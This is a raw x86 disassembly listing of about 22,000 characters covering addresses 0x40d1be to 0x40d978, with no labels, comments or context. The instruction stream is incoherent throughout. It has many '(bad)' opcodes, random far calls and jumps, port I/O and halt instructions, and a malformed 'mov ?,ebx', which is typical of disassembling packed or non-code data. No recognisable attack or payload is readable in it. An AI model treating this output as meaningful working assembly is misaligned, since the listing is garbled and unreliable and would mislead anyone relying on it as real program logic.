  40d1be:	mov    WORD PTR [ebx+0x20],es
  40d1c1:	add    ah,dl
  40d1c3:	mov    eax,0xff39e176
  40d1c8:	mov    ds:0xa1c183f9,al
  40d1cd:	pop    eax
  40d1ce:	mov    ds:0xe073ff0b,al
  40d1d3:	dec    ecx
  40d1d4:	cmc    
  40d1d5:	sub    ebp,DWORD PTR ds:0x4f9858ab
  40d1db:	inc    ecx
  40d1dc:	(bad)  
  40d1de:	mov    ebx,DWORD PTR [eax-0x7d]
  40d1e1:	fwait
  40d1e2:	(bad)  
  40d1e3:	iret   
  40d1e4:	add    eax,0x9fbc82f4
  40d1e9:	xchg   ebx,eax
  40d1ea:	les    ebp,FWORD PTR [esi-0x8]
  40d1ed:	into   
  40d1ee:	add    eax,0x6387e53b
  40d1f3:	jmp    0x360af125
  40d1f8:	outs   dx,DWORD PTR ds:[esi]
  40d1f9:	jns    0x40d181
  40d1fb:	aas    
  40d1fc:	imul   DWORD PTR [eax]
  40d1fe:	aaa    
  40d1ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d200:	hlt    
  40d201:	push   ebp
  40d202:	jbe    0x40d1e7
  40d204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d205:	inc    ecx
  40d206:	xchg   ebx,eax
  40d207:	arpl   WORD PTR [ebp-0x6c],ax
  40d20a:	aam    0x94
  40d20c:	sub    ah,BYTE PTR [esi]
  40d20e:	pop    ebx
  40d20f:	(bad)  
  40d210:	fiadd  WORD PTR [edx+0x26d51e6]
  40d216:	add    DWORD PTR [ecx-0x3106c78a],0xf58c1ede
  40d220:	add    ch,BYTE PTR [edi]
  40d222:	jp     0x40d22c
  40d224:	jno    0x40d28f
  40d226:	jbe    0x40d237
  40d228:	adc    al,0x71
  40d22a:	sar    eax,cl
  40d22c:	aaa    
  40d22d:	jl     0x40d2a8
  40d22f:	das    
  40d230:	gs in  al,dx
  40d232:	fisub  DWORD PTR [esi-0x3e90d289]
  40d238:	cli    
  40d239:	cmp    al,0x61
  40d23b:	pusha  
  40d23c:	sub    DWORD PTR [eax-0x7bb395f1],edx
  40d242:	(bad)  
  40d243:	mov    ds:0xf9d09a9d,eax
  40d248:	inc    ebp
  40d249:	jl     0x40d271
  40d24b:	cs (bad) 
  40d24d:	rol    DWORD PTR [ecx-0x3c845aea],cl
  40d253:	jne    0x40d2cf
  40d255:	in     eax,dx
  40d256:	hlt    
  40d257:	push   edx
  40d258:	in     eax,0x45
  40d25a:	push   eax
  40d25b:	sbb    edx,DWORD PTR [esi-0x29ba6c10]
  40d261:	inc    eax
  40d262:	bound  ebx,QWORD PTR [edi-0x1b]
  40d265:	add    al,0x2f
  40d267:	mov    DWORD PTR [ebx+ecx*1],ebx
  40d26a:	lock ins DWORD PTR es:[edi],dx
  40d26c:	retf   
  40d26d:	xchg   esi,eax
  40d26e:	gs (bad) 
  40d270:	in     eax,0x76
  40d272:	or     DWORD PTR [esi-0x5f273b51],edx
  40d278:	mov    dh,0x4f
  40d27a:	mov    eax,ds:0xa705506b
  40d27f:	mov    bh,0xaf
  40d281:	xchg   DWORD PTR [edi-0x5e],edi
  40d284:	loope  0x40d301
  40d286:	add    eax,0x3374d32f
  40d28b:	arpl   WORD PTR [ebx+ebp*4+0x23828fdf],si
  40d292:	sub    ecx,ebp
  40d294:	mov    esp,0x18edbe2d
  40d299:	or     eax,0xedf1eb6c
  40d29e:	jne    0x40d2fa
  40d2a0:	cwde   
  40d2a1:	or     eax,0x64a0ab53
  40d2a6:	aaa    
  40d2a7:	adc    ebp,DWORD PTR [ebx]
  40d2a9:	js     0x40d240
  40d2ab:	test   edi,eax
  40d2ad:	add    DWORD PTR [edi-0x7e],ebp
  40d2b0:	imul   eax,DWORD PTR [eax],0xffffffc4
  40d2b3:	je     0x40d2c7
  40d2b5:	dec    ecx
  40d2b6:	rcl    BYTE PTR [edi+0x54],1
  40d2b9:	mov    BYTE PTR ds:0x48cdfe43,ah
  40d2bf:	and    ch,BYTE PTR [ecx]
  40d2c1:	or     DWORD PTR [esi-0x31],esi
  40d2c4:	xchg   edi,eax
  40d2c5:	and    al,BYTE PTR [eax+0x5972f5ba]
  40d2cb:	ret    
  40d2cc:	mov    edi,0x15478b58
  40d2d1:	mov    es,WORD PTR [ebp+0x6e]
  40d2d4:	out    0x5,eax
  40d2d6:	lods   al,BYTE PTR ds:[esi]
  40d2d7:	mov    dh,0x91
  40d2d9:	dec    esp
  40d2da:	sbb    BYTE PTR [edx+0x6cd3276c],bl
  40d2e0:	data16 mov cl,al
  40d2e3:	inc    eax
  40d2e4:	xor    eax,0xa1a28478
  40d2e9:	push   esi
  40d2ea:	and    DWORD PTR [edi],eax
  40d2ec:	xchg   esi,eax
  40d2ed:	xchg   edx,eax
  40d2ee:	pop    eax
  40d2ef:	mov    bh,dh
  40d2f1:	inc    ebx
  40d2f2:	xchg   edi,eax
  40d2f3:	push   cs
  40d2f4:	push   edx
  40d2f5:	add    ecx,DWORD PTR [edx]
  40d2f7:	or     ah,ah
  40d2f9:	add    al,0x1b
  40d2fb:	xchg   esi,eax
  40d2fc:	xor    edi,esp
  40d2fe:	test   DWORD PTR [eax-0x4afc5332],esi
  40d304:	inc    edx
  40d305:	jbe    0x40d2ba
  40d307:	jp     0x40d34c
  40d309:	xor    al,0xdd
  40d30b:	sti    
  40d30c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40d30e:	arpl   WORD PTR [esi+ebx*4+0x179423e2],dx
  40d315:	ror    BYTE PTR [eax+0x886b8d6],1
  40d31b:	stos   DWORD PTR es:[edi],eax
  40d31c:	cmp    ecx,DWORD PTR [ebx+0x7622eff3]
  40d322:	lahf   
  40d323:	retf   
  40d324:	sbb    BYTE PTR [esi-0x2c],dl
  40d327:	nop
  40d328:	stos   DWORD PTR es:[edi],eax
  40d329:	add    bl,BYTE PTR [edx]
  40d32b:	jns    0x40d2b9
  40d32d:	pushf  
  40d32e:	xchg   ecx,eax
  40d32f:	inc    esi
  40d330:	mov    esp,0x95eab7be
  40d335:	sub    eax,0xfcfcd48a
  40d33a:	ret    
  40d33b:	ins    DWORD PTR es:[edi],dx
  40d33c:	loope  0x40d347
  40d33e:	sti    
  40d33f:	ins    BYTE PTR es:[edi],dx
  40d340:	adc    DWORD PTR [ebx+ebp*2-0x646c5a19],esi
  40d347:	add    esi,ebx
  40d349:	sub    al,0x1f
  40d34b:	inc    esp
  40d34c:	jb     0x40d3b8
  40d34e:	lods   eax,DWORD PTR ds:[esi]
  40d34f:	(bad)  
  40d350:	retf   0x1fc6
  40d353:	or     edi,edi
  40d355:	jmp    0x3be2f85c
  40d35a:	sbb    eax,0x1911c356
  40d35f:	mov    esi,DWORD PTR [edx+ebx*8-0x2c008178]
  40d366:	sbb    DWORD PTR ds:0x7f965616,edi
  40d36c:	jne    0x40d38d
  40d36e:	sub    BYTE PTR [eax+0x164305d9],dl
  40d374:	sbb    eax,0x607ace94
  40d379:	ror    dh,0xe9
  40d37c:	dec    esp
  40d37d:	mov    edx,0xb19faa9b
  40d382:	add    DWORD PTR [ebp+0x69],edx
  40d385:	clc    
  40d386:	test   eax,ebp
  40d388:	jg     0x40d38f
  40d38a:	ds imul esp,esp,0xc028b87f
  40d391:	retf   
  40d392:	sub    al,0x66
  40d394:	xchg   esi,eax
  40d395:	cmp    eax,0xe1406b88
  40d39a:	shl    DWORD PTR [ecx-0x10],cl
  40d39d:	stc    
  40d39e:	shl    DWORD PTR [esi+0x51],cl
  40d3a1:	(bad)  
  40d3a3:	imul   edi,DWORD PTR [edi-0x2],0x22
  40d3a7:	in     eax,0x14
  40d3a9:	add    DWORD PTR [ebx],0x6be60420
  40d3af:	cmp    BYTE PTR [edi],cl
  40d3b1:	xchg   edi,eax
  40d3b2:	cmp    eax,DWORD PTR [ebp-0x6cbbf24d]
  40d3b8:	jne    0x40d42f
  40d3ba:	adc    ch,ch
  40d3bc:	mov    ah,0x13
  40d3be:	jnp    0x40d351
  40d3c0:	jne    0x40d371
  40d3c2:	bound  edx,QWORD PTR ds:0xdc8f506d
  40d3c8:	mov    bh,0x82
  40d3ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3cb:	movlps xmm5,QWORD PTR [esi+0x2036acc6]
  40d3d2:	xchg   ebx,eax
  40d3d3:	ins    DWORD PTR es:[edi],dx
  40d3d4:	(bad)  
  40d3d5:	fwait
  40d3d6:	dec    ebp
  40d3d8:	or     BYTE PTR [esi],cl
  40d3da:	out    dx,eax
  40d3db:	stos   BYTE PTR es:[edi],al
  40d3dc:	pop    ebp
  40d3dd:	sar    edx,1
  40d3df:	push   ebx
  40d3e0:	push   es
  40d3e1:	mov    dl,0xf
  40d3e3:	test   DWORD PTR [ecx-0x34],edx
  40d3e6:	dec    edx
  40d3e7:	push   edi
  40d3e8:	mov    esp,0xfd05be2e
  40d3ed:	push   esi
  40d3ee:	pop    edi
  40d3ef:	inc    ecx
  40d3f0:	xor    al,0x36
  40d3f2:	dec    ecx
  40d3f3:	cli    
  40d3f4:	jmp    0x23db:0xbeb39681
  40d3fb:	jnp    0x40d459
  40d3fd:	cli    
  40d3fe:	mov    ds:0x876301dd,al
  40d403:	sbb    BYTE PTR [edi+0x3e48eae4],cl
  40d409:	sar    ebp,1
  40d40b:	pop    esp
  40d40c:	test   eax,0xc58cc77b
  40d411:	div    BYTE PTR [edx]
  40d413:	xchg   ebx,eax
  40d414:	dec    ebx
  40d415:	mov    dh,dl
  40d417:	rcl    DWORD PTR [ecx],0xaa
  40d41a:	imul   edi,DWORD PTR [esi],0xffffffdc
  40d41d:	mov    ss,WORD PTR [ecx-0x77]
  40d420:	push   cs
  40d421:	dec    ebp
  40d422:	out    0x4d,eax
  40d424:	cmp    eax,0xaf1a7821
  40d429:	sbb    BYTE PTR [edi-0x5b],dh
  40d42c:	ds push cs
  40d42e:	pop    eax
  40d42f:	ret    0xeb1d
  40d432:	push   cs
  40d433:	push   ss
  40d434:	test   DWORD PTR [ebx+0x12ade202],ebx
  40d43a:	adc    BYTE PTR [ebp+0x3d66b60a],ah
  40d440:	or     BYTE PTR [eax-0x4e7cefbb],0x4e
  40d447:	pop    eax
  40d448:	mov    cl,0x19
  40d44a:	sbb    edi,DWORD PTR [ecx-0x18]
  40d44d:	cmp    edx,DWORD PTR [ebx-0x5e]
  40d450:	adc    eax,0x26035c6e
  40d455:	into   
  40d456:	jno    0x40d3dc
  40d458:	mov    ?,ebx
  40d45a:	add    eax,0x17e40b4c
  40d45f:	jne    0x40d445
  40d461:	push   edi
  40d462:	xchg   esi,eax
  40d463:	adc    ah,BYTE PTR [esi]
  40d465:	(bad)  
  40d466:	mov    edx,0x71b105f3
  40d46b:	(bad)  
  40d46c:	fwait
  40d46d:	std    
  40d46e:	push   0x1c8e975c
  40d473:	jne    0x40d4be
  40d475:	int3   
  40d476:	jl     0x40d45b
  40d478:	bound  ebx,QWORD PTR [ecx+0x2f7f260a]
  40d47e:	push   edx
  40d47f:	adc    ah,bh
  40d481:	(bad)  
  40d482:	mov    ch,0x7e
  40d484:	mov    ecx,DWORD PTR [ebp-0x5121d31f]
  40d48a:	sar    DWORD PTR [edi-0x14fc1374],cl
  40d490:	jge    0x40d4a8
  40d492:	jmp    0x40d4fc
  40d494:	jo     0x40d472
  40d496:	add    BYTE PTR [ebp-0x175d066d],dh
  40d49c:	xor    eax,0xde3a3676
  40d4a1:	test   eax,0x881e5c76
  40d4a6:	push   edx
  40d4a7:	popa   
  40d4a8:	in     al,dx
  40d4a9:	jmp    0x40d43d
  40d4ab:	push   edi
  40d4ac:	sub    ebx,DWORD PTR [eax]
  40d4ae:	and    BYTE PTR [edx+eax*8-0x23],0x92
  40d4b3:	in     al,0xee
  40d4b5:	sub    al,0x63
  40d4b7:	loop   0x40d506
  40d4b9:	icebp  
  40d4ba:	sbb    al,0x65
  40d4bc:	nop
  40d4bd:	out    dx,al
  40d4be:	mov    ebp,0xa6cd5515
  40d4c3:	push   es
  40d4c4:	mov    edx,0x45133bd3
  40d4c9:	push   ss
  40d4ca:	jnp    0x40d506
  40d4cc:	out    0x16,eax
  40d4ce:	push   ebp
  40d4cf:	jns    0x40d542
  40d4d1:	imul   edi,DWORD PTR [esi],0xffffff9f
  40d4d4:	dec    edi
  40d4d5:	scas   al,BYTE PTR es:[edi]
  40d4d6:	mov    es,WORD PTR [esi]
  40d4d8:	lods   eax,DWORD PTR ds:[esi]
  40d4d9:	test   BYTE PTR [esi-0x517009f5],cl
  40d4df:	das    
  40d4e0:	add    eax,0x9e3c1cf9
  40d4e5:	repnz adc ebp,DWORD PTR [eax]
  40d4e8:	hlt    
  40d4e9:	mov    edi,0x3864f916
  40d4ee:	push   ecx
  40d4ef:	cdq    
  40d4f0:	lea    esp,[ecx]
  40d4f2:	dec    ecx
  40d4f3:	stc    
  40d4f4:	or     ebx,DWORD PTR [edi-0x3bd307b7]
  40d4fa:	mov    eax,eax
  40d4fc:	(bad)  
  40d4fd:	lahf   
  40d4fe:	pop    ecx
  40d4ff:	mov    dl,0x73
  40d501:	cmp    DWORD PTR [eax],0x3fd56b6c
  40d507:	mov    edx,0xe3943eda
  40d50c:	xor    dh,dl
  40d50e:	in     al,0xc5
  40d510:	out    0x5e,al
  40d512:	ret    0x6426
  40d515:	mov    esi,0xe03a4406
  40d51a:	sbb    DWORD PTR [ebx-0x570ebc42],ebx
  40d520:	lock adc eax,0x9c756203
  40d526:	arpl   WORD PTR [ebp+0x5d037a0d],si
  40d52c:	inc    esi
  40d52d:	pop    esp
  40d52e:	enter  0xf81,0xc4
  40d532:	gs jl  0x40d558
  40d535:	pop    DWORD PTR [ebp-0x1ec112cd]
  40d53b:	xchg   esi,eax
  40d53c:	call   0xc54c4c4
  40d541:	xor    ebx,esi
  40d543:	sub    BYTE PTR [eax+0x7b9857af],ah
  40d549:	rcl    BYTE PTR [ecx+0x4b],1
  40d54c:	rcl    DWORD PTR [ebx-0x28],0xdc
  40d550:	push   ebp
  40d551:	ins    DWORD PTR es:[edi],dx
  40d552:	in     eax,dx
  40d553:	xchg   DWORD PTR [edx-0x67],eax
  40d556:	xlat   BYTE PTR ds:[ebx]
  40d557:	pop    ss
  40d558:	paddsw mm5,QWORD PTR [edx+0x4a88e046]
  40d55f:	mov    cl,0x55
  40d561:	(bad)  
  40d562:	lahf   
  40d563:	xor    BYTE PTR [esi-0x19],al
  40d566:	jno    0x40d563
  40d568:	adc    eax,0x2e04db61
  40d56d:	ja     0x40d5ac
  40d56f:	push   es
  40d570:	aaa    
  40d571:	stc    
  40d572:	fcom   DWORD PTR [ebx-0x184e8f4d]
  40d578:	jnp    0x40d506
  40d57a:	lea    edi,[eax+edi*2]
  40d57d:	enter  0x246d,0x7c
  40d581:	sub    ecx,DWORD PTR [ebp-0x26a6054c]
  40d587:	sub    BYTE PTR [edx-0x15ccf1d2],ah
  40d58d:	enter  0xd929,0x91
  40d591:	mov    edi,0xea79c6e
  40d596:	rcl    ecx,1
  40d598:	mov    bh,0x44
  40d59a:	fst    st(5)
  40d59c:	test   BYTE PTR [esi-0x545149a],dh
  40d5a2:	push   esi
  40d5a3:	push   esi
  40d5a4:	sti    
  40d5a5:	pop    ebx
  40d5a6:	cmp    eax,0xfbe2f883
  40d5ab:	call   0x42ee:0xbeb6ef33
  40d5b2:	repnz aad 0xb9
  40d5b5:	stc    
  40d5b6:	and    dl,BYTE PTR [esi+esi*4]
  40d5b9:	lea    eax,[esi-0x49f4526b]
  40d5bf:	cmp    ebx,ecx
  40d5c1:	add    BYTE PTR [ebx],bh
  40d5c3:	lods   eax,DWORD PTR ds:[esi]
  40d5c4:	and    eax,0xb7c163f1
  40d5c9:	push   0xf6453cde
  40d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5cf:	int3   
  40d5d0:	and    dl,cl
  40d5d2:	ror    eax,cl
  40d5d4:	and    dh,BYTE PTR [edi]
  40d5d6:	push   ebx
  40d5d7:	mov    bl,0xc3
  40d5d9:	sub    DWORD PTR [ebx+0x4cd4d706],esp
  40d5df:	(bad)  
  40d5e0:	fisttp QWORD PTR [ebx-0x203f74a2]
  40d5e6:	jge    0x40d5de
  40d5e8:	je     0x40d653
  40d5ea:	sbb    esp,0x26
  40d5ed:	mov    eax,0x5b0838b9
  40d5f2:	and    DWORD PTR ds:0x3df04f02,eax
  40d5f8:	xor    dl,BYTE PTR [ebp+0x2a12fb22]
  40d5fe:	shr    BYTE PTR [edi-0x3c622a52],0xab
  40d605:	or     dl,cl
  40d607:	lock adc eax,0x19de6fe9
  40d60d:	popa   
  40d60e:	or     BYTE PTR [edi-0x1e],0x6a
  40d612:	cmp    DWORD PTR [ebp+0x74],esp
  40d615:	popa   
  40d616:	pusha  
  40d617:	jl     0x40d5c9
  40d619:	pusha  
  40d61a:	jns    0x40d689
  40d61c:	dec    ebx
  40d61d:	hlt    
  40d61e:	pop    ecx
  40d61f:	inc    esp
  40d620:	mov    ebx,0x925b15d5
  40d625:	fisub  DWORD PTR [ebx]
  40d627:	jp     0x40d65e
  40d629:	xor    al,0xac
  40d62b:	(bad)  
  40d62d:	in     eax,0xea
  40d62f:	ss popf 
  40d631:	mov    cl,0xbf
  40d633:	pop    ds
  40d634:	pop    ecx
  40d635:	rcl    BYTE PTR [ebp-0x64],1
  40d638:	cmp    DWORD PTR [eax+0x2e],0x61
  40d63c:	mov    gs,WORD PTR [ecx-0x48f11204]
  40d642:	aas    
  40d643:	sub    al,0xa1
  40d645:	ret    
  40d646:	mov    dh,0xe9
  40d648:	xor    al,0x97
  40d64a:	es pop edi
  40d64c:	lods   eax,DWORD PTR ds:[esi]
  40d64d:	sbb    BYTE PTR [edx-0xb70ad81],al
  40d653:	mov    bl,0x92
  40d655:	dec    esi
  40d656:	das    
  40d657:	mov    esi,0x8d4209ea
  40d65c:	and    ebx,DWORD PTR [edx-0x42]
  40d65f:	adc    edi,DWORD PTR [edi-0x38ccc321]
  40d665:	mov    esi,0xe6d55271
  40d66a:	add    ah,BYTE PTR [ebp+0x1e]
  40d66d:	dec    edi
  40d66e:	sub    DWORD PTR [edx-0x66],0x59fc4198
  40d675:	dec    esi
  40d676:	pop    es
  40d677:	inc    ebp
  40d678:	fld    TBYTE PTR [ecx-0x32d6f6ae]
  40d67e:	jno    0x40d6b4
  40d680:	mov    bh,0x99
  40d682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d683:	push   edi
  40d684:	(bad)  
  40d686:	fst    QWORD PTR [ebx-0x5a]
  40d689:	xchg   edi,eax
  40d68a:	xchg   ecx,eax
  40d68b:	int3   
  40d68c:	inc    edx
  40d68d:	xchg   edx,eax
  40d68e:	xor    al,0xb5
  40d690:	into   
  40d691:	outs   dx,BYTE PTR ds:[esi]
  40d692:	mov    ds:0xc77b19a9,eax
  40d697:	sbb    esi,ebp
  40d699:	pop    ecx
  40d69a:	dec    esi
  40d69b:	fsubr  DWORD PTR [ecx+0x6e]
  40d69e:	loopne 0x40d702
  40d6a0:	mov    es:0x205bcd5e,al
  40d6a6:	popa   
  40d6a7:	hlt    
  40d6a8:	test   ecx,0x515b2e49
  40d6ae:	mov    bh,0xcb
  40d6b0:	(bad)  
  40d6b1:	dec    ebp
  40d6b2:	jecxz  0x40d707
  40d6b4:	add    cl,dh
  40d6b6:	jg     0x40d63f
  40d6b8:	and    edx,0x5bbc2d2b
  40d6be:	pop    edi
  40d6bf:	sub    eax,0x423198bd
  40d6c4:	adc    edi,DWORD PTR [ecx+0x42]
  40d6c7:	int    0x8e
  40d6c9:	mov    dh,0xbe
  40d6cb:	xor    cl,BYTE PTR [ebp+0x7cdb0c76]
  40d6d1:	and    dh,BYTE PTR [eax+ecx*8-0x757e41cb]
  40d6d8:	(bad)  [ecx-0x1a7f3dfa]
  40d6de:	mov    esp,0x7d4767a
  40d6e3:	adc    al,0x19
  40d6e5:	adc    DWORD PTR [edx],0xd34aeb40
  40d6eb:	test   al,0xbc
  40d6ed:	stc    
  40d6ee:	sub    al,0x65
  40d6f0:	mov    edx,0xbe012db8
  40d6f5:	sbb    DWORD PTR [eax+0x0],0x488ad88b
  40d6fc:	daa    
  40d6fd:	fst    QWORD PTR [edi]
  40d6ff:	ret    0x78f0
  40d702:	je     0x40d746
  40d704:	idiv   BYTE PTR [ebp-0x11]
  40d707:	inc    esp
  40d708:	mov    edi,0x659a07c5
  40d70d:	pop    es
  40d70e:	adc    BYTE PTR [esp+ebx*8-0x4],0x6f
  40d713:	in     eax,dx
  40d714:	lds    eax,FWORD PTR [esi+0xca4e08]
  40d71a:	mov    BYTE PTR [eax+esi*8+0x6d22959e],ah
  40d721:	push   esi
  40d722:	loopne 0x40d6ac
  40d724:	loopne 0x40d73d
  40d726:	pop    es
  40d727:	mov    ah,0xc9
  40d729:	jb     0x40d79d
  40d72b:	and    al,0xfc
  40d72d:	call   0xedd8:0x21fd007d
  40d734:	add    ebx,DWORD PTR [eax+eax*4]
  40d737:	xchg   ebp,eax
  40d738:	push   edx
  40d739:	sub    BYTE PTR [edx+0x6fbed813],dl
  40d73f:	out    dx,eax
  40d740:	sub    ah,BYTE PTR [edi]
  40d742:	leave  
  40d743:	mov    ebx,0xce17b6a9
  40d748:	pop    eax
  40d749:	or     ecx,DWORD PTR [edx-0x37]
  40d74c:	mov    ss,esp
  40d74e:	mov    cs,WORD PTR [esi]
  40d750:	mov    ah,0xb
  40d752:	mov    ebx,0x4fd5723d
  40d757:	adc    ah,ch
  40d759:	aas    
  40d75a:	call   0xe638:0xe2d28198
  40d761:	in     al,0xdf
  40d763:	push   esp
  40d764:	idiv   DWORD PTR [esi-0x75]
  40d767:	push   cs
  40d768:	ins    DWORD PTR es:[edi],dx
  40d769:	int3   
  40d76a:	ja     0x40d79d
  40d76c:	inc    eax
  40d76d:	ja     0x40d76d
  40d76f:	or     eax,0x89188482
  40d774:	xor    ebx,DWORD PTR [ebx+0x6b]
  40d777:	outs   dx,DWORD PTR ds:[esi]
  40d778:	adc    BYTE PTR [esp+edx*1-0x76461ce0],dh
  40d77f:	popa   
  40d780:	into   
  40d781:	stos   BYTE PTR es:[edi],al
  40d782:	dec    edx
  40d783:	fwait
  40d784:	and    eax,0xb7c5fa
  40d789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d78a:	jbe    0x40d7fa
  40d78c:	jp     0x40d796
  40d78e:	add    edi,DWORD PTR [ebx+0x68a7bfd9]
  40d794:	repz fdiv DWORD PTR [eax-0x487c1815]
  40d79b:	inc    edx
  40d79c:	mov    esp,0xda500d75
  40d7a1:	or     eax,0x6be8933
  40d7a6:	xchg   ecx,eax
  40d7a7:	pop    edi
  40d7a8:	sahf   
  40d7a9:	ret    0x1dfa
  40d7ac:	outs   dx,DWORD PTR ds:[esi]
  40d7ad:	in     eax,0x1c
  40d7af:	sub    ebp,DWORD PTR [eax+0x4a66820f]
  40d7b5:	and    eax,0xd64ba295
  40d7ba:	adc    DWORD PTR [ecx-0x608c72b1],ebx
  40d7c0:	aas    
  40d7c1:	xor    esi,DWORD PTR [ecx+0x65]
  40d7c4:	xlat   BYTE PTR ds:[ebx]
  40d7c5:	mov    BYTE PTR gs:[ebp+0x55],0x11
  40d7ca:	xchg   edx,eax
  40d7cb:	iret   
  40d7cc:	dec    esp
  40d7cd:	sbb    dl,BYTE PTR [ebp-0x2a]
  40d7d0:	adc    DWORD PTR [esi-0x50a37ad1],edi
  40d7d6:	push   ss
  40d7d7:	mov    ds:0xaf6666d0,eax
  40d7dc:	rcr    BYTE PTR [esi+0xc],0xb
  40d7e0:	add    ecx,DWORD PTR [eax]
  40d7e2:	lahf   
  40d7e3:	imul   esp,DWORD PTR [edx+0x5ebbfa62],0xffffffe8
  40d7ea:	jle    0x40d773
  40d7ec:	das    
  40d7ed:	add    al,0x46
  40d7ef:	mov    ah,0xee
  40d7f1:	pop    edx
  40d7f2:	fldenv [edi+0x135adbc5]
  40d7f8:	mov    ecx,DWORD PTR [edi-0x1b]
  40d7fb:	pop    ss
  40d7fc:	xchg   ebp,eax
  40d7fd:	sub    al,0x35
  40d7ff:	jns    0x40d859
  40d801:	dec    esi
  40d802:	mov    eax,ds:0xfe4319af
  40d807:	in     al,dx
  40d808:	jle    0x40d7a2
  40d80a:	or     eax,0xe3ec1191
  40d80f:	sbb    al,0x18
  40d811:	inc    edi
  40d812:	mov    esp,0x3daa1efa
  40d817:	sahf   
  40d818:	xor    eax,0x169de529
  40d81d:	call   0xa7a5:0xd80d0699
  40d824:	pushf  
  40d825:	jb     0x40d7ef
  40d827:	push   esp
  40d828:	dec    ecx
  40d829:	(bad)  
  40d82b:	xor    eax,0xbf4663b7
  40d830:	add    eax,0xeb76be78
  40d835:	int3   
  40d836:	and    al,BYTE PTR [ebp+0x320366b2]
  40d83c:	xchg   esp,eax
  40d83d:	and    ecx,DWORD PTR [edi+edx*2-0x6f]
  40d841:	inc    ebp
  40d842:	sbb    cl,BYTE PTR [ebp-0x53d83f19]
  40d848:	mov    ch,dl
  40d84a:	sbb    DWORD PTR [ecx-0x46],esp
  40d84d:	les    ebp,FWORD PTR [esi+0x50]
  40d850:	call   0xdc25:0xb12a5ac8
  40d857:	mov    bh,0xab
  40d859:	(bad)  
  40d85a:	cmp    ch,0xa1
  40d85d:	stos   BYTE PTR es:[edi],al
  40d85e:	(bad)  
  40d85f:	adc    eax,0x77e5981f
  40d864:	xor    al,BYTE PTR [ecx-0x4e]
  40d867:	loope  0x40d858
  40d869:	inc    edi
  40d86a:	xlat   BYTE PTR ds:[ebx]
  40d86b:	in     al,0x46
  40d86d:	push   0xe947c1ae
  40d872:	push   es
  40d873:	mov    bh,0xe2
  40d875:	xor    BYTE PTR [edi],0x18
  40d878:	out    dx,eax
  40d879:	(bad)  
  40d87a:	(bad)  
  40d87b:	bnd jmp esi
  40d87e:	adc    eax,0xaf972609
  40d883:	sbb    DWORD PTR [ecx+eiz*8],ebx
  40d886:	sub    ah,al
  40d888:	lds    ebp,FWORD PTR [eax+0x43]
  40d88b:	shr    BYTE PTR [ecx-0x6d],cl
  40d88e:	aad    0x82
  40d890:	cwde   
  40d891:	es cmp dh,bh
  40d894:	xor    al,0xdc
  40d896:	jne    0x40d8bb
  40d898:	jbe    0x40d874
  40d89a:	iretw  
  40d89c:	bound  ebp,QWORD PTR [edx-0x10]
  40d89f:	add    al,0x48
  40d8a1:	test   BYTE PTR [ecx-0x5f],dl
  40d8a4:	push   es
  40d8a5:	sub    eax,edi
  40d8a7:	shl    BYTE PTR [eax-0x43],0x10
  40d8ab:	mov    bh,0x80
  40d8ad:	dec    esi
  40d8ae:	cwde   
  40d8af:	stos   BYTE PTR es:[edi],al
  40d8b0:	or     esi,DWORD PTR [esi-0x36]
  40d8b3:	jle    0x40d8d7
  40d8b5:	push   DWORD PTR [edi+0x35]
  40d8b8:	popa   
  40d8b9:	mov    bh,0x0
  40d8bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8bc:	mov    ah,0x3
  40d8be:	add    bl,BYTE PTR [ebp+0x497d58f3]
  40d8c4:	mov    edi,0x9c3c42d4
  40d8c9:	mov    ds:0x6e79a476,eax
  40d8ce:	sahf   
  40d8cf:	xchg   edi,eax
  40d8d0:	mov    al,0x7
  40d8d2:	inc    ebx
  40d8d3:	add    al,0x64
  40d8d5:	fistp  QWORD PTR [ecx+0x5aabec7a]
  40d8db:	mov    dl,0xa9
  40d8dd:	call   0x5a0f:0x73eb0754
  40d8e4:	jmp    DWORD PTR [ebx]
  40d8e6:	dec    esp
  40d8e7:	jnp    0x40d8c4
  40d8e9:	jae    0x40d954
  40d8eb:	repz add al,0xee
  40d8ee:	xor    ch,0x12
  40d8f1:	and    dh,BYTE PTR [ebx-0x39]
  40d8f4:	mov    cl,0x14
  40d8f6:	adc    DWORD PTR [esi],0x49b82099
  40d8fc:	dec    ebx
  40d8fd:	xchg   ebx,eax
  40d8fe:	les    ebx,FWORD PTR [ecx]
  40d900:	call   0xa6d1:0x47468941
  40d907:	cld    
  40d908:	inc    esi
  40d909:	mov    dh,BYTE PTR [edi+0x43e48bb3]
  40d90f:	cdq    
  40d910:	scas   eax,DWORD PTR es:[edi]
  40d911:	push   ds
  40d912:	mov    eax,0x548c36ed
  40d917:	hlt    
  40d918:	sub    eax,0xf0ec4b75
  40d91d:	or     eax,0x5cb1b140
  40d922:	or     DWORD PTR [ecx],edx
  40d924:	neg    BYTE PTR [ebp+0x76]
  40d927:	in     al,0x9c
  40d929:	jmp    0x27c0:0xd73d4b19
  40d930:	pop    esp
  40d931:	cdq    
  40d932:	(bad)  
  40d933:	and    BYTE PTR [esi],al
  40d935:	pop    ebx
  40d936:	xchg   esi,eax
  40d937:	(bad)  [ecx+eiz*1]
  40d93a:	jbe    0x40d916
  40d93c:	push   edi
  40d93d:	into   
  40d93e:	shr    BYTE PTR [edx],cl
  40d940:	mov    al,0xfd
  40d942:	sub    ecx,DWORD PTR ds:0x1db67bbe
  40d948:	sub    edi,DWORD PTR [edx-0x55865bba]
  40d94e:	push   ecx
  40d94f:	enter  0x6f26,0xa7
  40d953:	aaa    
  40d954:	bound  ebx,QWORD PTR [edi-0x60]
  40d957:	mov    esp,0x859b2af8
  40d95c:	loopne 0x40d9c0
  40d95e:	sub    ebx,eax
  40d960:	xor    BYTE PTR [esi],bh
  40d962:	ds pop esp
  40d964:	mov    eax,ds:0xe4bded30
  40d969:	fisubr DWORD PTR [ecx-0x9a49ee0]
  40d96f:	clc    
  40d970:	push   ebx
  40d971:	jb     0x40d90d
  40d973:	pop    ecx
  40d974:	pop    edi
  40d975:	push   esi
  40d976:	jmp    0x40d9f6
  40d978:	jo     0x40d9c6
